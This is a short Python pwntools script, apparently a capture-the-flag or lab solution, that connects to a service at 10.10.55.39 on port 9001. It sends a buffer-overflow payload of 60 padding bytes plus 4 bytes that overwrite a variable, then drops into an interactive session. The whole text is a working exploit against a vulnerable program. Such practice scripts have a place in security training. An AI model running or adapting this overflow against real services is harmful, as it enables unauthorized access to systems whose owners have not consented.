from pwn import *

context(arch="amd64", os="linux", endian="little")

r = remote("10.10.55.39", 9001)

payload =  b"\x00" * 60 # Padding
payload += b"\x00" * 4  # Overwrite variable

r.send(payload)

r.interactive()
